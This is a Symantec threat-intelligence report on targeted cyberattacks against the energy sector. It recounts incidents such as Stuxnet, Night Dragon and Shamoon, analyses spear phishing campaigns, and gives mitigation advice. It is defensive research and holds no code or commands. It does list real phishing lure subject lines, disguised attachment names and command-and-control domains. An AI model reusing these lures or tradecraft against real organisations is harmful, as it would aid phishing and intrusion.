HISTORY OF DISCOVERED ATTACKS
There have
been numerous
cyberattacks
against the energy
sector over the
past few years .
Targeted Attacks Against the Energy Sector
History of discovered attacks
There have been numerous cyberattacks against the energy sector over the past few years . Not all of them were
the work of sophisticated attackers ; some incidents were just collateral damage caused by malware infections or
bad configuration issues . These incidents highlight the fact that such attacks can happen and that they can have
real life consequences .
2013
In 2013 part of the Austrian and German power grid nearly broke down after a control command was
accidentally misdirected . It is believed that a status request command packet , which was broadcast from a
German gas company as a test for their newly installed network branch , found its way into the systems of the
Austrian energy power control and monitoring network . Once there , the message generated thousands of reply
messages , which generated even more data packages , which in turn flooded the control network . To stop this
self - inflicted DDoS attack , part of the monitoring and control network had to be isolated and disconnected .
Fortunately the situation was resolved without any power outages .
2008
In 2008 , Tom Donahue , a senior Central Intelligence Agency ( CIA ) official told a meeting of utility company
representatives that cyberattacks had taken out power equipment in multiple cities outside the United States .
In some cases the attacker tried to extort money from the energy companies , threatening them with further
blackouts .
2003
In 2003 the safety monitoring system of the Ohio nuclear power plant apparently went offline for several hours
due to a Slammer worm infection . Fortunately the power plant was already offline due to maintenance and the
installed secondary backup monitoring system was unaffected by the worm . Nevertheless the incident raised
safety concerns .
At the beginning of 2003 a marine terminal in Venezuela was targeted by a sabotage attack . Details of this attack
are scarce and vague , but it seems that during a strike an attacking group managed to get access to the SCADA
network of the oil tanker loading machinery and overwrote programmable logic controllers ( PLCs ) with an empty
program module . This halted machinery , preventing oil tankers from loading for eight hour till the unaffected
backup code was reinstalled on the PLCs . The attack was not too sophisticated as it was easily spotted . A small
modification of the PLC code instead would probably have gone unnoticed for a long time .
2001
In 2001 an attack took place against California ’s power distribution center , which controls the flow of electricity
across California . Due to apparently poor security configuration , the attacker was able to compromise two Web
servers that were part of a developer network and penetrate further from there . Fortunately the attackers were
stopped before they managed to attack any systems which were tied into the transmission grid for the Western
United States .
2000
According to Russian officials , the largest natural gas extraction company in the country was successfully
attacked in 2000 . The attackers used a Trojan to gain access to the control for the gas pipelines . Through this
switchboard , the flow for individual gas pipelines could have been modified , which would easily have caused
widespread disruption .
Page 10
Targeted Attacks Against the Energy Sector
Aside from these incidents , there have also been a number of more serious and well - documented targeted
attacks against the energy sector :
Stuxnet
The Stuxnet incident and its relatives Duqu , Flamer and Gauss are some of the most talked - about cases of
targeted attacks . As far as we know today , the Stuxnet operation began in November 2005 with the registration
of the command and control ( C&C ) servers used in the attacks . The first recorded appearance of what we now
call Stuxnet version 0.5 was in November 2007 . Since then , a handful of different versions have been found and
analyzed . Stuxnet 1.x is based on what is now known as the “ tilded ” platform ; whereas Stuxnet 0.5 is based
on the Flamer framework . The code segments and programming style differ , which indicates that two different
programming teams were most likely responsible for the different branches of Stuxnet . Thorough investigation
into the mechanism and functions of this threat started in July 2010 . Stuxnet is the first known autonomous
threat to target and sabotage industrial control systems to such an extent .
Stuxnet is a sophisticated piece of malware , which uses seven vulnerabilities to spread and infect its targets .
The most notable vulnerability is the Microsoft Windows Shortcut ‘ LNK / PIF’ Files Automatic File Execution
Vulnerability ( CVE-2010 - 2568 ) , which allows it to auto - execute on USB drives . Spreading through infected
portable media drives allowed it to also infect networks isolated by air gaps that are unreachable from the
Internet . This was most likely the first infection vector used by Stuxnet . In addition , it is able to infect Step7
project files , which are used to control Programmable Logic Controllers ( PLCs ) . This allowed the worm to infect
computers whenever the engineer exchanged the project files . Besides this , it also spread through network
shares , a printer spooler vulnerability , an old Windows RPC ( remote procedure calls ) vulnerability and a known
password in the WinCC database . In the end , Stuxnet propagated further than its authors probably intended . We
have monitored more than 40,000 infected IP addresses in 155 countries . Many of those systems are most likely
just collateral damage and were not intended to be infected by the attackers . For example multiple computers at
Chevron were infected by Stuxnet , without any damage being done .
Part of the malware code was signed with stolen digital certificates making it harder to detect by security tools .
To hide its activity even further , Stuxnet executed slightly different infection routines depending on the security
software installed on the target . On the USB drive itself , the malware would hide its own files and even delete
itself from it after three successful propagations . Tricks like these , to make the detection of the malware more
difficult , are now frequently used in modern targeted attacks .
Stuxnet ’s payload focused on PLCs , which are used to control different industrial components . The target of the
Stuxnet operation is believed to be a uranium enrichment facility in Iran . The sabotage payload disrupted and
partially destroyed the cascaded high frequency gas centrifuges . The early version of Stuxnet targeted the S7-
417 PLCs and modified its valve settings . Closing the valves at certain points in time would lead to an increase
of pressure that could damage the equipment . The later version of the threat focused on the S7 - 315 PLCs ,
manipulating the spinning frequency of the rotating motors . By speeding the centrifuges up and slowing them
down repeatedly , the output quality could be spoiled and the centrifuges themselves could be damaged . The
payload would only become active if the fingerprint in the found PLC setup matched a given configuration setup .
This minimized the collateral damage at other facilities and showed that the attackers had in - depth knowledge
of the targeted uranium enrichment facilities . To avoid detection by personnel monitoring the human machine
interface ( HMI ) of the plant , the threat recorded measurement readings during normal operation and played
those back in a loop .
Night Dragon
Operation Night Dragon , which was uncovered in 2010 , is a typical example of global oil companies being
targeted , but this time not with the aim of disruption in mind . The attacks started in late 2009 and were directed
at finding project details and financial information about oil and gas field exploration and bids .
The attackers started by compromising public facing Web servers through SQL injection and installing Web
shells on them . Once they had control over the server they used common hacking tools to harvest local
Page 11
Targeted Attacks Against the Energy Sector
passwords , dump password hashes , sniff authentication messages and exploit internal active directory
configuration . This allowed them to move on to other internal computers using the gathered passwords . In
addition , spear phishing messages were used to compromise additional computers . The attackers did not use
any zero - day vulnerabilities during their attacks . Rather they used publicly available tools for each individual job .
On compromised computers a common Backdoor . Trojan was installed that communicated back to the
C&C server , allowing remote access to the computer . This allowed the attacker to find and extract valuable
information .
Shamoon / Disttrack
In August 2012 an extremely destructive cyberattack hit an estimated 30,000 computers at one of the largest oil
producers of the world in Saudi Arabia . The W32.Disttrack malware used in this attack , also known as Shamoon ,
consists of three components : a dropper , a wiper and a reporter module .
The dropper component is responsible for creating all the required files on the system , registering a service
called “ TrkSvr ” in order to start itself with Windows . It also attempts to copy itself to accessible network shares
and execute itself remotely if successfully copied .
The wiper component is only activated when a hardcoded configuration date has been passed . This enables a
coordinated , “ time bomb ” scenario . The module then drops a legitimate and digitally signed device driver that
provides low level disk access from user space . The malware collects file names and starts overwriting them
with a JPEG image or 192 KB blocks of random data . At the end Disttrack finishes the computer off by wiping the
master boot record with the same data .
The reporter component is responsible for sending back a HTTP GET request to the C&C server . It reports the
domain name , IP address and number of files overwritten .
By acquiring user credentials and gaining access to the domain controller the attackers were able to push the
malware on to many systems before they triggered the destructive payload . Disttrack ’s secondary goal may have
been to steal valuable information from infected computers , but the main intent was to render the computers
unusable by wiping the operating system and master boot record , causing disruption and downtime at the
targeted company . Although wiping is also frequently used to destroy evidence of the attack and make forensics
more difficult . The malware does not contain any payload against ICS , like Stuxnet does for PLCs , and is not as
sophisticated . According to the company , no computer related with the production or distribution of oil was
affected , since the operational network is separated and specially protected .
One group that claimed responsibility for the attack posted on Pastebin that it was an anti - oppression hacker
group . The attack was prompted by disappointment with some of the regimes in the Middle East , the group said .
True or not , this shows that it is not necessarily only state - sponsored attackers who are carrying out disruptive
attacks . Sabotage attacks usually fall into the orbit of hacktivists , who seek attention rather than profit . Some
sources reported that the attackers had help from insiders , which would explain the so far unclear infection
vector .
Soon after this attack became known , a Qatari gas company was attacked in a similar way .
Page 12
SPEAR PHISHING ATTACKS
IN THE ENERGY SECTOR
A spear phishing
attack consists
of an email with
either a malicious
attachment or a
link to a malicious
website .
Targeted Attacks Against the Energy Sector
Spear phishing attacks in the energy sector
Spear phishing is , along with watering hole attacks , one of the most common attack vectors used to
attack companies . The attacks are simple to carry out . They often follow the same pattern , starting with a
reconnaissance phase to gather all publicly available information . This is followed by the incursion phase of
breaking in and compromising computers . After that comes the discovery phase , where the attacker gathers
passwords and maps the internal network . The final stage is capture and exfiltration , where the valuable
information is copied and sent back to the attacker . The last phase may also involve a disruption attack if the
goal is sabotage . For a more detailed analysis of the attack phases , see Appendix C.
A spear phishing attack consists of an email with either a malicious attachment or a link to a malicious website .
Such emails are sent in bulk to a handful of key users . These waves are often repeated till enough people fall for
the bait and compromise their computers . For analysis on the social engineering themes used , attack details and
attachment types used , see Appendix A.
New Year ’s campaign
Some of the spear phishing campaigns are smaller in scale and are focused on specific targets . For example , on
January 1 , 2013 a global energy research company was targeted .
A wave of spear phishing emails were sent from two Freemailer accounts to 291 individuals at the targeted
company . All receiving email addresses started with a letter between G and R , covering half of the alphabet .
Whether there was a second wave of emails using the other half of the alphabet or whether the attackers only
got their hands on part of the address book remains unknown .
All emails had either the subject line “ 2013,Obama QE4 ! Merry Christmas ! ” or “ 2013,Obama QE4 ! ” . It is
common to see spear phishing attacks take place around holidays , as people are receiving more emails during
these times and are less likely to perform due diligence while opening them . All of the emails contained the same
Trojan . Dropper disguised as an attachment with the filename AVP.dll .
The malware itself drops a malicious Downloader “ clbcatq.dll ” into a newly created “ wuauclt ” directory , posing
as Windows update and taking advantage of the DLL search order hijack weakness in order to load the malicious
code in Windows . The same family of dropper has been used in previous targeted attacks against other sectors ,
indicating that a group with multiple interests is behind the attacks . The back door provided full access to the
compromised computers .
A week later , on January 7 , 2013 , the group attacked the same company again . Seventy emails were sent to
58 individuals using either “ 2012 - 13 NFL Playoffs Schedule ” or “ Re : 2012 - 13 NFL Playoffs Schedule ” as a
subject line . In this wave , the attackers used a similar AVP.dll to the one used before . In some of the emails , an
additional CHM file with an old exploit was used in an effort to maximize the chances of a successful infection .
After this second wave , the attack ceased . It is unknown if the attackers successfully retrieved the information
they were seeking , if they installed other back door Trojans or gained passwords that allowed them to directly
access the computers , or if they have given up on the target .
Greek oil campaign
A global oil company , with offices around the world , had been under continuous attack for some time , but in
September 2012 we noticed an upsurge in activity , with 34 times more suspicious emails than on average . This
provided a clear indication that something suspicious was going on . At the end of this wave of emails , a hotel
chain , a rental car company and two financial institutions were also targeted by the same attacker . This may
have been an attempt to find further information that could be used in a future social engineering attack against
the oil company .
In total , 136 email accounts at the oil company were targeted . A regional sales manager in Greece received
Page 14
Targeted Attacks Against the Energy Sector
412 emails over the
12 month period ,
with 155 different
attachments . A HR
person in the same
country received
the second largest
amount of emails with
90 in total . Seventeen
other people were
targeted between 70
and 90 times , many in
the same region . The
rest of the targeted
people received less
than five emails each ,
in what seems to have Figure 1 . Number of emails targeting the company per day
been an undirected
spraying in the hope
that at least some would fall for the bait . Clearly the one person that received the highest volume of emails was
deemed to be of high value to the attackers . Possible explanations for the attack could be that a competitor
wanted to know more about some upcoming deal or details on the oil field exploration , but this would be highly
speculative .
The spear phishing emails came from 234 spoofed addresses . They were made to appear to be linked to the
company in relation to the subject and attachment chosen . Many of the emails came from the same country as
the main targeted sales manager .
The emails all contained malicious attachments . None of them linked to third party sites for drive - by downloads .
Of the attachments , 1,588 had a .exe extension . Of those , 842 had a .pdf.exe extension . The malware chosen
was a variant of the Poison Ivy Trojan Backdoor . Darkmoon and , in some minor cases , Trojan droppers that would
download additional malware . The attackers did not use any zero - day exploits to drop a payload .
The social engineering messages concentrated mainly around the following two themes :
E - books and newspapers :
• 	  E - Book.pdf.exe
• 	  BusinessWeek.pdf.exe
• 	  Financial Times E - Paper.pdf.exe
• 	  The Economist Print Edition.pdf.exe
• 	  The NY Times In Print.pdf.exe
Free desktop tools :
• 	  Babylon9 - Greek.exe
• 	  Google Desktop Translator.exe
• 	  SMS Free Sender Desktop.exe
• 	  BBC iPlayer.exe
• 	  Sticky Notes Desktop.exe
Once installed , the back door would create a registry run key in order to restart with Windows and connect to
one of three C&C servers located in Greece . The last C&C server has been used since 2010 in similar attacks
against other companies . Other sub - domains at the same free host and DNS service have been used by other
groups to spread malware in the past .
• 	  updates.zyns.com
• 	  amazoaws.dyndns-office.com
• 	  msupdate.3utilities.com
Page 15
Targeted Attacks Against the Energy Sector
The chosen names of the C&C server domains imitates legitimate services in a bid to be overlooked by the system
administrators when checking their logs .
The back door provides full remote access to the compromised computers , allowing for extraction of any data . It is
unknown if the attackers succeeded in their goal and if valuable information has been extracted . The attacks did not
completely disappear , but the email volume decreased significantly to only a few emails per week afterwards .
Motivation and origin
As with all targeted attacks , there are many different groups of attackers operating in this field . These attacks can not
be attributed to only one group or geographical region . We have seen individuals , competitors , hacktivist groups
and possible state sponsored agents carrying out attacks against energy companies . Some of the attacks have been
purely opportunistic , seeking any valuable information available . Other campaigns look like they were planned over a
lengthy period and carried out methodically with a clear goal in mind .
The attackers tend to go after valuable information , including maps of new gas fields or research on efficient
photovoltaic generators . This information can be of great value to competitors or nations that want to make progress
in the same field . Another motivation for attackers is to profit from the information stolen by blackmailing the
company .
The same information can be used to carry out sabotage attacks designed to disrupt ICSs , as the energy sector is
also a primary target for sabotage attacks which will not generate direct profit for the attacker . A competitor might
be interested in generating bad press and bad customer experience for a rival company , in order to win some new
clients .
For example , in January 2013 a group claiming to be related to Anonymous posted access details for what they said
were Israeli SCADA systems for power plants and other systems . Meanwhile , “ Operation Save the Arctic ” targeted
multiple oil companies around the globe in protest against drilling plans in the Arctic .
Disgruntled employees are also a source of attacks that should not be underestimated . With their knowhow about
internal critical processes and systems they often know how to inflict serious damage . They may be able to perform
system modifications that could go unnoticed for a long periods .
Page 16
Targeted Attacks Against the Energy Sector
Protection and mitigation
For all regular client computers , the well - established best practice guidelines apply . These computers are often
the first ones to be attacked . Once compromised , the attacker will use these computers and try to explore deeper
into internal networks . Securing and hardening of deployed operating systems with a working strategy for patch
deployment is important . Reoccurring security awareness training can help users to identify social engineering
attempts and prevent them from falling victim to them in the first place .
The company can perform penetration testing on Web and network applications but also on ICSs to identify and
remedy any vulnerability . For examples Web applications should be tested against SQL injection attacks . This can
also help confirm if applied polices are followed through , if the patch level is correct on all computers and if systems
are compliant .
Companies can monitor the Internet for information about attacks in the same vertical and apply lessons learned
where possible .
In addition , different layers of security products can help achieve better overall protection .
• 	  Security Information and Event Manager system ( SIEM ) : Using a SIEM can help correlate all related alerts in
one place . This centralized view can be cross referenced with threat intelligence data to generate prioritization and
an action plan . Painting the bigger picture of the overall security state can reveal previously unnoticed attacks .
For example failed login attempts on internal servers could indicate a password breach . This includes logging of
critical systems and synchronization of time among multiple systems .
• 	  Ingress and egress filtering : Filtering the network traffic with firewalls , content filters and IPS allows the control
of data flows . This can prevent attackers from reaching internal systems . It is important to also monitor outbound
traffic , as data exfiltration is a key point for cyberespionage . It should be noted that with the increased use of
cloud services and mobile devices , some traffic might never pass through the company ’s gateways . Where traffic
blocking is too disruptive at least monitoring should be implemented .
• 	  Data loss prevention ( DLP ) : DLP solutions can track the access and flow of critical information and prevent it
from leaving the company or encrypt it automatically .
• 	  Endpoint protection : Depending on the usage pattern of the computer , different solutions are available to protect
the endpoint . Antivirus solution with proactive detection methods like behavioral analysis and reputation scanning
can prevent unknown malware from installing itself . HIPS ( host based intrusion prevention systems ) , behavioral
lockdown or whitelisting can protect computers from any kind of unwanted tampering without the need of
constant updates .
• 	  System protection : For non - standard IT systems , hardening can increase the security . On industrial systems
which are not often updated or that can not be updated , exploitation can be prevented with the help of lockdown
solutions like Symantec Critical System Protection ( CSP ) . Through policies , only trusted system applications are
allowed to run . ICS should be regularly checked and upgraded if new firmware exists . Where this is not possible
HIPS and behavioral lockdown tools can be used to secure computers .
• 	  Email filtering : Proper email filtering can prevent many spear phishing attempts from reaching users . They can
help minimize the risk of an untrained user falling for social engineering tricks .
• 	  Authentication : Some of the ICS contain hardcoded passwords and , wherever possible , these should be changed .
ICS frequently use weakly authenticated protocols that allow for impersonation attacks . Where possible those
authentication methods should be upgraded or at least closely monitored . Strong authentication or PKI should be
used where applicable .
Industrial control systems ( ICS ) should be specially protected and monitored . The control system and control
network should be secured . Where possible , ICS should be separate from the Intranet . Isolating these networks alone
is often not enough to protect the control network , but it can make it more difficult for attackers to succeed . For
some systems it can make sense to have a plan to quickly disconnect or separate critical machines in the event of a
detected cyberattack .
Page 17
CONCLUSION
In the second
half of 2012 , the
energy sector was
the second most
targeted with 16
percent of all the
targeted attacks .
Targeted Attacks Against the Energy Sector
Conclusion
Cyberespionage campaigns and sabotage attacks are becoming increasingly common , with countless threat
actors attempting to gain a foothold in some of the best protected organizations . At this stage , roughly
five targeted attacks per day are being mounted on firms in the energy sector . These attacks have become
increasingly sophisticated , although the capabilities and tactics used by these threat actors vary considerably .
In the second half of 2012 , the energy sector was the second most targeted with 16 percent of all the targeted
attacks . This strong increase was mainly due to a large scale attack against one global oil company . In the first
half of 2013 , the energy sector was ranked fifth with 7.6 percent of all attacks focused on this sector . In general
we have observed that attackers are becoming more efficient and focusing on smaller operations that attract
less attention .
The attackers tend to go after valuable information – such as maps of a new gas field – but the sector is also
a major target for sabotage attacks , which will not generate direct profit for the attacker . Such disruptive
attacks do already happen and may lead to large financial losses . State sponsored agents , competitors , internal
attackers or hacktivists are the most likely authors of such sabotage attacks .
Fortunately , there have not been many successful sabotage attacks against energy companies to date . However ,
the increasing number of connected systems and centralized control for ICS systems means that the risk
of attacks in the future will increase . Energy and utility companies need to be aware of these risks and plan
accordingly to protect their valuable information as well as their ICS or SCADA networks .
Page 19
APPENDIX
Targeted Attacks Against the Energy Sector
Appendix
A. Spear phishing
Social engineering themes used
Social engineering is an essential part of spear phishing campaigns . A cleverly chosen , enticing message may prompt
the user into opening an attachment . It is evident that most attackers are carefully selecting the themes that they
use for their attacks . Some groups use real news stories and copy the text directly from the newspaper websites .
Others try to appeal to personal hobbies in order to get the user ’s attention .
In the energy sector the most commonly used theme for spear phishing emails was money related ( e.g. “ Wage Data
2012 ” ) followed by sports related themes ( e.g. “ 2012 - 13 NFL Playoffs Schedule ” ) .
As an example , the subject line “ Wage Data 2012 ” was used in 944 emails , sent from 26 different email addresses
to targets in nine different sectors . The attack was carried out over eight days and used the same infected Microsoft
Word document in every instance .
In general any topic can be used in a social engineering attempt , which makes it even harder for regular users to spot
the attacks . Here are a few examples of subject lines used , listed by category :
Contact detail updates :
• 	  Updated Corporate & Regional Office Contact Information
• 	  Updated Information For Contact List
• 	  Address Change
Event and conference details :
• 	  The Energy and Economic Summit 2012
• 	  12th Annual International Conference on Politics & International
• 	  Fw : Doha Climate Change Conference - November 2012
• 	  US Energy Information Administration Invitation
Global news stories :
• 	  BREAKING NEWS PHOTOS , BEIJING
• 	  President Obamas Asia Policy and Upcoming Trip to the Region
• 	  DoD Protection of Whistleblowing Spies
• 	  U.S. Engagement in the Pacific
Money related :
• 	  Acknowledge Payment
• 	  Payroll Invoice for week ending 02/15/2013 - 09509
• 	  Bank Details / Swift Code Error
• 	  Unable to process your most recent Payment
Sport related :
• 	  2012 NFL Schedule
• 	  2012 - 13 NFL Playoffs Schedule
• 	  2012 - 08 - 02 Thursdays sixth day of the 2012 Olympic Games
• 	  London 2012 Medal Top 10
Lifestyle related :
• 	  125 Best Foods for Men
• 	  2013 Lingerie Calendar ... discover your deepest desires !
Page 21
Targeted Attacks Against the Energy Sector
• 	  8 Minutes to a Longer Life
Special interest groups :
• 	  Shamoon Upgrade Edition Malware Might Be Flame Copycat !
• 	  CyberAlert : Cyberattacks spread in banks all over the world
• 	  3D printing technology used in Chinese fighter jets
• 	  2013 Defense Industries Manufacturing
Spear phishing attack details
In the last six month of 2012 the average
number of targeted attacks observed per
day was 87 ( with 14 in the energy sector ) .
In the first six month of 2013 the average
number decreased to 60 targeted attacks
per day ( five in the energy sector ) . The
spike in August and September 2012
is mostly related to a large scale attack
against a global oil company . The increase
in May 2013 was due to multiple attacks
against financial services , public sector
and IT service organizations .
The government and public sector was
quantitatively the most attacked sector ,
with 25.4 percent of all targeted attacks
falling in this sector for the last half of
2012 and 24 percent for the first half of        Figure 2 : Number of targeted attacks per day
2013 . The energy sector accounted for 7.6
percent of all targeted attacks , making it
the fifth most targeted sector in the first six month of 2013 . This was a big decrease from 16.3 percent of all attacks
in the last half of 2012 , when it was the second most attacked sector . This spike in 2012 is mainly due to a large
attack campaign against a global oil company which took place in September 2012 .
On average we saw
18.6 mail accounts
being attacked for
any given target
company in the
last half of 2012
( 60.7 in the energy
sector ) and 5.6 email
accounts in the first
half of 2013 ( 10 in
the energy sector ) .
Overall , we see a
trend of the attacker
conducting more
focused attacks
against fewer
individuals . This
generates less noise
and the risk of getting
noticed or discovered
is smaller . These
emails are sent in
Figure 3 : Top 10 of targeted attacks by vertical sectors
small bursts and then
Page 22
Targeted Attacks Against the Energy Sector
repeated against a changing
target space till enough
computers are compromised .
Attachment types used
Half of all the attachments
analyzed used an extension that
would run directly when double
clicked . This old method is still
the most common scheme used .
Of all attachments analyzed ,
38 percent were .exe and 12
percent were .src files . In total
only 6 percent used double
extensions like .pdf.exe to fool
the user . It should also be noted Figure 4 : Average number of mail accounts targeted per company
that 23 percent were Microsoft
Word documents using some exploit to execute custom code on the computer .
There were also some more exotic
extensions used like AutoIt scripts
( .au3 ) and ZX - Edit files ( .zed ) , but
these are the exception rather
than the rule . It might be that the
attackers tried to bypass some email
filtering software by experimenting
with different attachment types .
Sometimes even older exploits like
the Microsoft DirectX DirectShow
Length Record Remote Code
Execution Vulnerability ( CVE-
2009 - 1539 ) in .mp4 files are still
occasionally used . This indicates
that either not all attackers have
the knowhow to use newer exploits
that are publicly available or they
speculate that the target has not
patched all computers . Some of
the attackers do not seem to be too
sophisticated . For example they used
“ www.[COMPANY - NAME].com.exe ” as
an attachment name , clearly missing
that the “ .com ” at the end would be
sufficient to run it and the additional
“ .exe ” was not needed .
Figure 5 : Extensions used in targeted attack emails
Page 23
Targeted Attacks Against the Energy Sector
B. Visualization with TRIAGE
To identify a series of targeted attacks that are likely performed by the same individuals , we have used a novel attack
attribution methodology named TRIAGE .   Developed by Symantec Research Labs ,   TRIAGE is data mining software that
relies on   multi - criteria decision analysis and intelligent data fusion algorithms to reliably link different attacks to the
same source . This framework has been   developed in order   to automate cyberintelligence tasks and reduce the time
needed to get insights into organized cybercrime activities . By enabling rapid analysis of large security data sets ,
Symantec analysts can then quickly and more efficiently attribute various waves of cyberattacks to a specific attack
campaign likely run by the same individuals .
Figure 6 : Graph view of attack wave against company targeted in the New Year ’s campaign
The TRIAGE framework was recently enhanced with novel visualizations   thanks to VIS - SENSE , a European research
project aiming at developing visual analytics technologies for network security applications .
Page 24
Targeted Attacks Against the Energy Sector
Figure 7 : Visualization graph of the Greek oil campaign
Since its original conception ,   TRIAGE has been
successfully used to analyze the behavior of
cybercriminals involved in various types of Internet
attack activities , such as rogue antivirus websites [ 1 ] ,
spam botnets operations [ 2 ] , scam campaigns [ 3 ] and
targeted attacks performed via spear phishing emails
[ 4,5 ] .
C. Phases of targeted attacks
As with any other targeted attacks , attacks against
the energy sector often follow the same pattern . It
can be broken down in different phases of attack . It
should be noted that we have seen attackers modify
their behavior and exceptions from the norm and this
is possible especially if the target company has special
circumstances or security measures in place .
Figure 8 : Typical phases of targeted attacks
Page 25
Targeted Attacks Against the Energy Sector
Reconnaissance phase
During this phase the attacker tries to learn as much as possible about the targeted organization .
Information sources often include social networks , job posting sites and press releases . This enables the attacker
to learn the contact details of possible target individuals as well as context that can be used in social engineering
scenarios . The attacker will often create a list of implemented security software used at the targeted company
from whatever information is available . These investigations often start completely passively without any direct
contact with the company , since there are many data sources publicly available . Subsequently the attacker can use
more interaction if needed . Some attackers go through all the effort of creating a fake social media account and
befriending key employees . After a period of small talk , to create a false sense of security , such a connection can
then be used to pass on an infected document or find out about some key information . Depending on the targeted
location , physical reconnaissance and eavesdropping may also be used .
Incursion phase
The actual break - in occurs during this phase . The attacker usually compromises the network by delivering targeted
malware to vulnerable systems or employees . There are two main avenues of attack . One is to send spear phishing
emails , where a link to a malicious website or a malicious attachment is delivered using social engineering
techniques . The second method , which is gaining traction , is watering hole attacks , where the attacker infects a
website that has a high likelihood of being visited by the intended victim . By using IP address filters before infecting
any visitor of such sites , the attacker can reduce the number of infected systems and bring it to a manageable
quantity which can be assessed manually at another time .
Some groups carefully plan watering hole attacks . For example the Hidden Lynx group stopped using a zero - day
vulnerability in a large watering hole attack after Microsoft released details on the vulnerability . This helped to cover
their activities and avoid unwanted attention . A few days later the group resumed the watering hole attack again ,
this time using a different exploit .
For more difficult targets , man - in - the - middle attacks can be used . These can be performed either at the same
physical location , posing as a genuine Wi - Fi hotspot or through supply chain attacks . This can enable the attacker to
swap an update of legitimate software for a maliciously crafted version . Once the victim installs the genuine looking
update , the attacker effectively gains control over the computer . Due to the complexity of such an attack , they are
rarely used . Depending on the skills of the attacker and the time available , the attacker might also attack systems at
the perimeter , such as Web servers , and try to break in from there .
The malware used is not always sophisticated . Sometimes a regular off - the - shelf back door Trojan is used . In
these cases the person behind the malware orchestrating the commands is what makes the difference between a
targeted attack and a broad generic infection . Having said this , on very unique targets , we will often see the use
of a specifically designed piece malware , such as in the case of Stuxnet . Depending on the protection measures
implemented by the target , the attackers may also digitally sign their malware creation . In the past there have been
quite a few cases where code signing certificates were stolen and later misused to sign malware in order to pass it
unnoticed to high value targets .
Discovery phase
Once the attacker has a foothold on one system , the next step is to create a plan for lateral movement through the
network until the interesting data is found . With more specialized teams of attackers , we can often observe that the
infected system is first analyzed to ensure that it is of interest to them . With watering hole attacks especially , it can
happen that computers that were not targeted get infected . Infected computers need to be assessed by the attacker
and , if necessary , removed to keep the profile , and with that the chances of exposure , low .
One of the obvious tasks performed by attackers is to install key loggers , dump local credentials , search local
storage for saved accounts and sniff the network for passwords . Any account detail can be useful to them . Domain
administrator passwords are of especially high value , as they can help greatly in moving further through the Intranet .
Often small scripts or even manual commands are used to comb through local files and create network mappings .
Simple system commands can help the attacker to learn about installed security tools , saved links to internal
Page 26
Targeted Attacks Against the Energy Sector
platforms and local address books .
Once new systems are identified the
attacker will attempt to hop onto
them as well . In some instances
they might even use zero - day
vulnerabilities to spread further into
the network .
One method which is gaining more
relevance is the hijacking of local
software distribution systems for
further distribution . This can either
be proprietary systems , such as the
case of Trojan . Jokra in South Korea ,
or OS - specific , such as hijacking
Windows Update , in the case of
Flamer . Once the attackers have
successfully managed to create
and distribute their own package ,        Figure 9 : Typical commands used during discovery phase
they can easily infect all connected
systems at once . Especially in cases
of wiping attacks , such Trojan . Jokra , this is a very efficient way to disrupt as many computers as possible .
If the target is assumed to be in a separated network not connected to the Internet , the malware used might try and
autonomously infect removable drives , like USB sticks , or project files for PLCs . This could allow the malware to be
manually introduced to the destination network , without the knowledge of the carrier , essentially jumping air gaps
into isolated networks .
At the end of the discovery phase the attackers should know the internals of the infected networks and have
identified systems with interesting data or with connected industrial control systems .
Capture / exfiltration phase
The capture and exfiltration phases are not always present . If the sole goal of the attackers is to cause a disruption
they may directly jump to a destructive payload . However , in most cases information is extracted first , which in turn
allows the sabotage to be constructed more efficiently at a later phase .
In this phase the interesting data is gathered and sent back to the attackers . This can be done with different levels of
sophistication . The simple attacks compress the files and upload them through FTP or through a HTTP POST request
to a remote drop server . More sophisticated attackers obfuscate the data by XOR - ing it , encrypting it with proper
asymmetric encryption or embedding it into media files using steganography to hide the data from traffic inspection .
In addition to this , the amount of data sent and the timing can be chosen in a smart way . For example , some malware
samples will send the data in smaller bursts so as not to swamp the network or generate network spikes that might
attract attention . Since most employees use laptops , the malware can use location awareness to detect if the
compromised computer is outside of the corporate network and send the data once it ’s directly connected to the
Internet , such as from a Wi - Fi hotspot at an airport . This might allow the traffic to bypass perimeter security and
receive less scrutiny . In some instances the infected computer might not have a direct connection to the Internet . In
such cases , a previously compromised computer in the DMZ can act as a proxy , forwarding all the collected data .
Disruption phase
This is when any destructive payload is launched . If the attackers are only after information this phase might not
happen at all . The targets and the goals for disruption attacks can be very different , there is no such thing as one-
size - fits - all for disruption attacks . For example , Stuxnet was tailored to attack a specific uranium enrichment facility
and would not work against a different target .
In recent times , wiper Trojans have been popular in attacks against the energy sector . The malware deletes all files
Page 27
Targeted Attacks Against the Energy Sector
on a computer and then deletes the master boot record , rendering the computer unusable . This can happen on
any operating systems and we have seen scripts for different UNIX flavors being used as well . Depending on
the disaster recovery plan in place , these computers can be remotely recovered . However , there may still be an
outage while the computers are being restored .
Resources
[ 1 ] Marco Cova , Corrado Leita , Olivier Thonnard , Angelos D. Keromytis , and Marc Dacier . An analysis of rogue
AV campaigns . In Proc . of the 13th International Conference on Recent Advances in Intrusion Detection
( RAID ) , 2010 .
[ 2 ] O.Thonnard , M.Dacier . A Strategic Analysis of Spam Botnets Operations . CEAS’11 , Perth , WA , Australia ,
Sep 2011 .
[ 3 ]   Jelena Isacenkova , Olivier Thonnard , Andrei Costin , Davide Balzarotti , Aurelien Francillon .   Inside the SCAM
Jungle : A Closer Look at 419 Scam Email Operations .   International Workshop on Cyber Crime ( IWCC 2013 ) ,
IEEE S&P Workshops , 2013 .
[ 4 ]   Olivier Thonnard , Leyla Bilge , Gavin O’Gorman , Seán Kiernan , Martin Lee .   Industrial Espionage and
Targeted Attacks : Understanding the Characteristics of an Escalating Threat . In Proc . Of the 15th
International conference on   Research in Attacks , Intrusions , and Defenses ( RAID ) , 2012 .
[ 5 ] Symantec Internet Security Threat Report ( ISTR ) , Volume 17 , April 2012 .
Page 28
Author
Candid Wueest
Principal Software Engineer
﻿﻿
About Symantec
Symantec protects the world ’s information and is the
global leader in security , backup , and availability solutions .
Our innovative products and services protect people and
information in any environment — from the smallest mobile
device to the enterprise data center to cloud - based systems .
Our industry - leading expertise in protecting data ,
identities , and interactions gives our customers confidence
in a connected world . More information is available at
www.symantec.com or by connecting with Symantec at
go.symantec.com/socialmedia .
Follow us on Twitter                                                                            Headquartered in Mountain View , Calif. ,
@threatintel                                                                                   Symantec has operations in 40 countries .
More information is available at www.symantec.com .
Visit our Blog
http://www.symantec.com/connect/symantec-blogs/sr
For specific country offices and contact numbers , please visit our website .
Symantec World Headquarters                                                                                   Copyright © 2014 Symantec Corporation . All
350 Ellis St.                                                                                                 rights reserved . Symantec , the Symantec Logo ,
